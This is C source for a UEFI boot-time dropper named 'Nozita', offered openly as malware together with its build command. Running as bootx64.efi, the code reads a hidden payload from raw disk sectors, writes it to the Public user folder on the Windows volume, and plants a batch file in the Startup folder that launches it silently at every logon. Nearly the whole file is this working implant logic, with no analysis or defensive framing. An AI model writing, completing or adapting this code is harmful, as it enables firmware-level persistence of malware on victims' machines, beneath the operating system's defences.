// efi.c — Nozita UEFI Dropper
// x86_64-w64-mingw32-gcc -ffreestanding -nostdlib -shared
//   -Wl,--subsystem,10 -e efi_main efi.c -o bootx64.efi

#include <stdint.h>

typedef uint64_t  UINTN;
typedef uint64_t  EFI_STATUS;
typedef void*     EFI_HANDLE;
typedef uint16_t  CHAR16;
typedef int       BOOLEAN;
typedef uint32_t  UINT32;
typedef uint64_t  UINT64;
typedef uint8_t   UINT8;

#define EFI_SUCCESS           0ULL
#define EFI_ERROR(s)          ((s) & (1ULL<<63))
#define EFI_BUFFER_TOO_SMALL  (0x8000000000000005ULL)

#define PAYLOAD_LBA     128ULL
#define PAYLOAD_SECTORS 256ULL
#define PAYLOAD_EXE_PATH  L"\\Users\\Public\\nozita_s.exe"
#define STARTUP_BAT_PATH  L"\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\nz.bat"

typedef struct { UINT32 T1; uint16_t T2,T3; UINT8 D[8]; } EFI_GUID;

typedef struct _EFI_BLOCK_IO EFI_BLOCK_IO;
typedef EFI_STATUS (*EFI_BLOCK_READ)(EFI_BLOCK_IO*,UINT32,UINT64,UINTN,void*);
typedef struct { UINT32 MediaId; BOOLEAN Rm,Mp,Lp,Ro,Wc; UINT32 BlockSize,IoAlign; UINT64 LastBlock; } EFI_BLOCK_IO_MEDIA;
struct _EFI_BLOCK_IO { UINT64 Rev; EFI_BLOCK_IO_MEDIA* Media; void*Rst; EFI_BLOCK_READ ReadBlocks; void*Wb,*Fb; };

typedef struct _EFI_FILE EFI_FILE;
typedef EFI_STATUS (*EFI_FILE_OPEN)(EFI_FILE*,EFI_FILE**,CHAR16*,UINT64,UINT64);
typedef EFI_STATUS (*EFI_FILE_CLOSE)(EFI_FILE*);
typedef EFI_STATUS (*EFI_FILE_READ)(EFI_FILE*,UINTN*,void*);
typedef EFI_STATUS (*EFI_FILE_WRITE)(EFI_FILE*,UINTN*,void*);
struct _EFI_FILE { UINT64 Rev; EFI_FILE_OPEN Open; EFI_FILE_CLOSE Close;
    void*Del,*Rd; EFI_FILE_READ Read; EFI_FILE_WRITE Write;
    void*GP,*SP,*GI,*SI,*Fl; };
#define EFI_FILE_MODE_READ   0x0000000000000001ULL
#define EFI_FILE_MODE_WRITE  0x0000000000000002ULL
#define EFI_FILE_MODE_CREATE 0x8000000000000000ULL

typedef struct { void* OpenVolume; } EFI_SIMPLE_FILE_SYSTEM;

typedef EFI_STATUS (*EFI_LOCATE_HANDLES)(int,EFI_GUID*,void*,UINTN*,EFI_HANDLE*);
typedef EFI_STATUS (*EFI_HANDLE_PROTOCOL)(EFI_HANDLE,EFI_GUID*,void**);
typedef EFI_STATUS (*EFI_ALLOCATE_POOL)(int,UINTN,void**);
typedef EFI_STATUS (*EFI_FREE_POOL)(void*);
typedef EFI_STATUS (*EFI_LOAD_IMAGE)(BOOLEAN,EFI_HANDLE,void*,void*,UINTN,EFI_HANDLE*);
typedef EFI_STATUS (*EFI_START_IMAGE)(EFI_HANDLE,UINTN*,CHAR16**);

typedef struct {
    uint8_t Hdr[24];
    void*R,*Rt,*Ap,*Fp,*Gm;
    EFI_ALLOCATE_POOL  AllocatePool;
    EFI_FREE_POOL      FreePool;
    void*Ce,*St,*Wf,*Se,*Cl,*Ck,*Ip,*Rp,*Up;
    EFI_HANDLE_PROTOCOL HandleProtocol;
    void*Res,*Rp2;
    EFI_LOCATE_HANDLES  LocateHandles;
    void*Ldp,*Ict;
    EFI_LOAD_IMAGE   LoadImage;
    EFI_START_IMAGE  StartImage;
    void*Ex,*Ui,*Ebs;
} EFI_BOOT_SERVICES;

typedef struct {
    uint8_t Hdr[24]; void*Fv; UINT32 Fr;
    EFI_HANDLE CiH; void*Ci; EFI_HANDLE CoH; void*Co; EFI_HANDLE SeH; void*Se;
    void*Rs; EFI_BOOT_SERVICES* BootServices;
} EFI_SYSTEM_TABLE;

static EFI_GUID BIO_GUID = {0x964e5b21,0x6459,0x11d2,{0x8e,0x39,0x00,0xa0,0xc9,0x69,0x72,0x3b}};
static EFI_GUID SFS_GUID = {0x964e5b22,0x6459,0x11d2,{0x8e,0x39,0x00,0xa0,0xc9,0x69,0x72,0x3b}};

static void* memcpy_e(void*d,const void*s,UINTN n){uint8_t*dd=(uint8_t*)d;const uint8_t*ss=(const uint8_t*)s;while(n--)*dd++=*ss++;return d;}

static EFI_STATUS ReadPayload(EFI_SYSTEM_TABLE*ST,void**ob,UINTN*os){
    UINTN hc=0; EFI_HANDLE*handles=NULL;
    EFI_STATUS s=ST->BootServices->LocateHandles(2,&BIO_GUID,NULL,&hc,NULL);
    if(s==EFI_BUFFER_TOO_SMALL){ST->BootServices->AllocatePool(4,hc,(void**)&handles);ST->BootServices->LocateHandles(2,&BIO_GUID,NULL,&hc,handles);}
    if(EFI_ERROR(s)||!handles)return s;
    UINTN n=hc/sizeof(EFI_HANDLE),pb=PAYLOAD_SECTORS*512;
    void*buf=NULL; ST->BootServices->AllocatePool(4,pb,&buf);
    for(UINTN i=0;i<n;i++){
        EFI_BLOCK_IO*bio=NULL;
        s=ST->BootServices->HandleProtocol(handles[i],&BIO_GUID,(void**)&bio);
        if(EFI_ERROR(s)||!bio)continue;
        if(bio->Media->Lp||bio->Media->BlockSize!=512)continue;
        s=bio->ReadBlocks(bio,bio->Media->MediaId,PAYLOAD_LBA,pb,buf);
        if(!EFI_ERROR(s)){*ob=buf;*os=pb;ST->BootServices->FreePool(handles);return EFI_SUCCESS;}
    }
    ST->BootServices->FreePool(handles);ST->BootServices->FreePool(buf);
    return 0x8000000000000000ULL;
}

static void DropPayload(EFI_SYSTEM_TABLE*ST,const void*buf,UINTN sz){
    UINTN hc=0; EFI_HANDLE*handles=NULL;
    EFI_STATUS s=ST->BootServices->LocateHandles(2,&SFS_GUID,NULL,&hc,NULL);
    if(s==EFI_BUFFER_TOO_SMALL){ST->BootServices->AllocatePool(4,hc,(void**)&handles);ST->BootServices->LocateHandles(2,&SFS_GUID,NULL,&hc,handles);}
    if(!handles)return;
    UINTN n=hc/sizeof(EFI_HANDLE);
    for(UINTN i=0;i<n;i++){
        EFI_SIMPLE_FILE_SYSTEM*fs=NULL;
        s=ST->BootServices->HandleProtocol(handles[i],&SFS_GUID,(void**)&fs);
        if(EFI_ERROR(s)||!fs)continue;
        typedef EFI_STATUS(*OV)(EFI_SIMPLE_FILE_SYSTEM*,EFI_FILE**);
        EFI_FILE*root=NULL; s=((OV)fs->OpenVolume)(fs,&root);
        if(EFI_ERROR(s)||!root)continue;
        EFI_FILE*td=NULL;
        s=root->Open(root,&td,L"\\Windows",EFI_FILE_MODE_READ,0);
        if(EFI_ERROR(s)){root->Close(root);continue;} td->Close(td);
        EFI_FILE*ef=NULL;
        s=root->Open(root,&ef,PAYLOAD_EXE_PATH,EFI_FILE_MODE_READ|EFI_FILE_MODE_WRITE|EFI_FILE_MODE_CREATE,0);
        if(!EFI_ERROR(s)){UINTN ws=sz;ef->Write(ef,&ws,(void*)buf);ef->Close(ef);}
        static const uint8_t bat[]="@echo off\r\nstart /min \"\" \"%PUBLIC%\\nozita_s.exe\"\r\n";
        EFI_FILE*bf=NULL;
        s=root->Open(root,&bf,STARTUP_BAT_PATH,EFI_FILE_MODE_READ|EFI_FILE_MODE_WRITE|EFI_FILE_MODE_CREATE,0);
        if(!EFI_ERROR(s)){UINTN bs=sizeof(bat)-1;bf->Write(bf,&bs,(void*)bat);bf->Close(bf);}
        root->Close(root); break;
    }
    ST->BootServices->FreePool(handles);
}

EFI_STATUS efi_main(EFI_HANDLE ImageHandle,EFI_SYSTEM_TABLE*ST){
    void*pb=NULL; UINTN ps=0;
    ReadPayload(ST,&pb,&ps);
    if(pb&&ps>0) DropPayload(ST,pb,ps);
    EFI_HANDLE wh=NULL;
    ST->BootServices->LoadImage(1,ImageHandle,NULL,NULL,0,&wh);
    if(wh) ST->BootServices->StartImage(wh,NULL,NULL);
    while(1){}
    return EFI_SUCCESS;
}
